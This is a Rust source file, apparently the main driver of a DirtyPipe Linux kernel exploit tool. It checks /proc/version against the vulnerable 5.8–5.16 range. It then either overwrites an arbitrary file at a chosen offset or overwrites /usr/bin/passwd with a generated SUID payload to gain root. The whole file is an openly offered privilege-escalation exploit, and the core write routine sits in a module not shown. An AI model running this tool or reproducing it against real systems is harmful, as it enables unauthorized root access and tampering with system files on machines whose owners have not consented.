use anyhow::{Result, anyhow};
use structopt::StructOpt;
use std::path::{Path, PathBuf};
use std::fs;

mod exploit;

#[derive(Debug, StructOpt)]
#[structopt(name = "DirtyPipe Exploit", about = "Exploit DirtyPipe to overwrite arbitrary files or gain root.")]
struct Opt {
    /// Mode. Can be "overwrite" or "suid"
    #[structopt(short, long)]
    mode: String,

    /// Input file. This data is what is written to the overwritten file.
    #[structopt(short, long)]
    input: Option<PathBuf>,

    /// Output file. The file to overwrite.
    #[structopt(short, long)]
    output: Option<PathBuf>,

    /// Offset to begin overwriting.
    #[structopt(short="b", long,)]
    offset: Option<i64>,
}

// Check if the host's kernel version to see if it is vulnerable.
// Basing version check on https://securitylabs.datadoghq.com/articles/dirty-pipe-vulnerability-overview-and-remediation/
fn is_kernel_vuln() -> Result<bool, anyhow::Error> {
    // Read version string from /proc/version
    let mut proc_version = fs::read_to_string("/proc/version")?;
    
    // Split to get just the kernel version
    let release_strings = proc_version.split("Linux version ").collect::<Vec<&str>>()[1].split(" ").collect::<Vec<&str>>()[0].split("-").collect::<Vec<&str>>();
    let kernel_version = String::from(release_strings[0]) + "-" + release_strings[1];

    println!("Kernel version: {}", kernel_version);

    // Split version string to check major and minor versions
    let versions: Vec<String> = kernel_version.split(".").map(|x| String::from(x)).collect();
    if versions[0].parse::<i32>().unwrap() != 5 { // Must be Kernel 5.x
        return Ok(false);
    }
    if versions[1].parse::<i32>().unwrap() < 8 || versions[1].parse::<i32>().unwrap() > 16 {
        return Ok(false)
    }

    // Check patch level
    let patch_level = versions[2].split("-").collect::<Vec<&str>>()[0].parse::<i32>().unwrap();
    let is_vuln = match versions[1].parse::<i32>().unwrap() {
        16 => patch_level < 11,
        15 => patch_level < 25,
        10 => patch_level < 102,
        _ => true
    };
    Ok(is_vuln)
}

fn main() -> Result<(), anyhow::Error> {
    // Warn if not a vulnerable kernel version
    if !is_kernel_vuln()? {
        println!("Warning! Your kernel version does not appear vulnerable!")
    }
    else {
        println!("Your kernel appears to be vulnerable.")
    }
    
    let opt = Opt::from_args();

    match opt.mode.as_str() {
        "overwrite" => {
            let input = opt.input.expect("input file is required in overwrite mode.");
            let output = opt.output.expect("output file is required in overwrite mode.");
            let offset = opt.offset.expect("offset is required in overwrite mode.");

            return exploit::exploit(input, output, offset);
        }
        
        "suid" => {
            // Ensure payload exists.
            if !Path::new("./suid").exists() {
                return Err(anyhow!("SUID payload must be generated using the provided python script!"));
            }
            

            return exploit::exploit("./suid".into(), "/usr/bin/passwd".into(), 0);
        }

        _ => {
             return Err(anyhow!("Mode must be overwrite or suid."));
        }
    }

    Ok(())
}
